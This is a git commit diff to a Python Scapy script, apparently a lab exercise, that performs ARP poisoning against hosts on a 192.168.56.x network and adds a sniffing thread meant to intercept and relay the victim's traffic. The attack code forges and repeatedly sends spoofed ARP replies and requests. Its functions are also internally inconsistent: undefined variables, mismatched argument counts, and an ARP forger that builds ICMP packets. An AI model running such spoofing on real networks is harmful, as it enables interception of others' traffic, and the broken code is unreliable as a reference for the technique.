b0ec012b6bd98ff2da3b51331866e90b4a298f63
JosWigchert <contact@joswigchert.nl>
2022-05-28 14:01:08 +0200

    added read packets thread

--- arp-poisoning.py
+++ arp-poisoning.py
@@ -21,6 +21,7 @@ ATTACKER_IP = get_if_addr(conf.iface)
 
 poison_thread: threading.Thread = 0
 poison_confirm_thread: threading.Thread = 0
+read_packets_thread: threading.Thread = 0
 
 
 
@@ -29,34 +30,58 @@ ipVictim = "192.168.56.101"
 
 ipToSpoof = "192.168.56.102"
 
-arp = Ether() / ARP()
-arp[Ether].src = ATTACKER_MAC
-arp[ARP].hwsrc = ATTACKER_MAC
-arp[ARP].psrc = ipToSpoof
-arp[ARP].hwdst = macVictim
-arp[ARP].pdst = ipVictim
+# arp = Ether() / ARP()
+# arp[Ether].src = ATTACKER_MAC
+# arp[ARP].hwsrc = ATTACKER_MAC
+# arp[ARP].psrc = ipToSpoof
+# arp[ARP].hwdst = macVictim
+# arp[ARP].pdst = ipVictim
 
 # sendp(arp, iface="enp0s3")
 
-def build_ether(_mac_attacker):
+def build_ether(attacker_mac):
     ether = Ether()
-    ether.src = _mac_attacker
-    ether.dst = macVictim
+    ether.src = attacker_mac
     return ether
 
 def build_icmp_echo():
     icmp = ICMP()
     return icmp
 
-def forge_l2_ping():
-    ping = build_ether(macVictim) / IP(dst=ipVictim) / build_icmp_echo()
+def build_arp(victim_dst_ip, victim_src_ip, victim_src_mac, attacker_mac, mode):
+    arp = ARP()
+    arp.hwsrc = attacker_mac
+    arp.psrc = victim_src_ip
+    arp.hwdst = victim_dst_mac
+    arp.pdst = victim_dst_ip
+    arp.op = mode # 1 for request, 2 for reply
+    return arp
+
+def forge_l2_ping(victim_src_ip, victim_dst_ip, victim_dst_mac):
+    # ping = build_ether(macVictim) / IP(dst=ipVictim) / build_icmp_echo()
+    ping = IP(src=victim_src_ip, dst=victim_dst_ip)/ICMP()
+    return ping
+
+def forge_arp(victim_src_ip, victim_dst_ip, victim_dst_mac):
+    # arp = build_ether(macVictim) / IP(dst=ipVictim) / build_icmp_echo()
+    arp = build_ether(ATTACKER_MAC)/ICMP()
+    return arp
 
 def arp_poison():
  while True:
     with lock:
         print("[*] Sending ARP poison packets...")
+        
+        icmp = forge_l2_ping(ipToSpoof, ipVictim, macVictim)
+        sendp(icmp)
+
+        arp = forge_arp(ipToSpoof, ipVictim, macVictim, ATTACKER_MAC, 2)
         sendp(arp) # iface="enp0s3"
-        print()
+
+        arp[ARP].op = 1
+        sendp(arp) # iface="enp0s3"
+
+        print("[*] end of ARP storm...")
 
     time.sleep(ARP_POISON_WARM_UP)
         
@@ -69,11 +94,20 @@ def poison_confirm():
             pkt.show()
             print()
 
+def read_packets():
+    while True:
+        pkt = sniff(count=1)
+
+        # read packets / add packets to file
+
+        # send packets to victim
+
 
 def main():
     #use daemon=True to run in background and stop when application quits
     poison_thread =  threading.Thread(target=arp_poison, daemon=True).start()
     poison_confirm_thread = threading.Thread(target=poison_confirm, daemon=True).start()
+    read_packets_thread = threading.Thread(target=read_packets, daemon=True).start()
 
     # wait for ctrl+c to exit application
     try: 
